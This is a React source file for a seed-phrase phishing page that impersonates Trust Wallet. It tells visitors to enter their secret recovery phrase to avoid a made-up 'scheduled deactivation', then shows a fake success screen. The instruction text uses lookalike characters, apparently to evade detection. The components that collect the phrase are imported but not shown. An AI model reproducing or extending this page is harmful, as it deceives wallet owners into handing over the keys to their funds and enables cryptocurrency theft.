import { useState } from 'react';
import InputField from './InputField';
import Select from './Select';
import { useValues } from '../contexts/InputContext';

export default function Form() {
   const { count, isUpdated, isComplete, dispatch } = useValues();
   const [next, setNext] = useState(false);

   return (
      <div className='grid mx-auto self-center'>
         {next ? (
            <main
               className={`${
                  count == 12 ? 'md:max-w-[438px]' : 'md:max-w-[700px]'
               } grid gap-4 self-center mx-auto border border-gray-600 rounded-lg p-6 `}>
               <img
               className='block mx-auto'
                  src='success.svg'
                  alt=''
               />
               <div className='text'>
                  <h1 className='text-center text-3xl font-medium mb-2'>
                     You have successfully Verified your wallet!
                  </h1>
                  <p className='text-center '>
                     Remember to keep your Secret Phrase safe!
                  </p>
               </div>
               <div className="bg-[#242426] p-4 rounded-sm my-4">
                 <h1 className='font-medium'>Trust set as default wallet</h1>
                 <p className='text-[14px] text-gray-400'>To enable seamless dApp connections, Trust Wallet is set to default.</p>
               </div>

               <button
                        className="bg-[#48ff91] w-full mx-auto text-black font-medium p-2 rounded-3xl"
                        type='submit'
                        disabled={!isComplete}
                        onClick={() => setNext((next) => !next)}>
                        Open Wallet
                     </button>
            </main>
         ) : (
            <main
               className={`${
                  count == 12 ? 'md:max-w-[438px]' : 'md:max-w-[700px]'
               } max-w-full grid gap-4 mx-4 border border-gray-600 rounded-lg p-6 `}>
               <div className='flex gap-4'>
                  <div className='w-1/2 h-1 bg-[#48ff91]'></div>
                  <div className='w-1/2 h-1 bg-green-800'></div>
               </div>
               <div className='text'>
                  <h1 className='text-center text-3xl font-medium mb-2'>
                     Verify your wallet
                  </h1>
                  <p className='text-center '>
                     To vеrifу уоur wаllеt enter passphrase words from your
                     Тɾust waIIet in the right order, after doing this correctly
                     your will be completely verified and the scheduled
                     deactivation will be removed automatically right after.
                  </p>
               </div>

               <form action='submit'>
                  <Select />
                  <InputField />

                  <div className='flex flex-col gap-4 font-medium'>
                     <button
                        className={
                           isUpdated ? 'text-[#48ff91]' : 'text-green-800'
                        }
                        type='reset'
                        disabled={!isUpdated}
                        onClick={() => dispatch({ type: 'reset' })}>
                        {' '}
                        Clear{' '}
                     </button>
                     {isComplete && (
                        <p className='flex gap-2 bg-[#f0b90b] bg-opacity-5 text-[#f0b90b] text-[14px] font-normal p-4'>
                           <span>
                              <svg
                                 className='text-iconWarning'
                                 fill='none'
                                 width='24'
                                 height='24'
                                 viewBox='0 0 24 24'
                                 xmlns='http://www.w3.org/2000/svg'>
                                 <path
                                    fillRule='evenodd'
                                    clipRule='evenodd'
                                    d='M12 21C16.9706 21 21 16.9706 21 12C21 7.02944 16.9706 3 12 3C7.02944 3 3 7.02944 3 12C3 16.9706 7.02944 21 12 21ZM10.75 15.5V18H13.25V15.5H10.75ZM10.75 6V13H13.25V6H10.75Z'
                                    fill='currentColor'
                                    className=''></path>
                              </svg>
                           </span>
                           Secret phrases must include 12 or 24 words
                        </p>
                     )}
                     <button
                        className={`${
                           isComplete ? 'bg-[#48ff91]' : 'bg-green-800'
                        } text-black p-2 rounded-3xl`}
                        type='submit'
                        disabled={!isComplete}
                        onClick={() => setNext((next) => !next)}>
                        Next
                     </button>
                  </div>
               </form>
            </main>
         )}
      </div>
   );
}
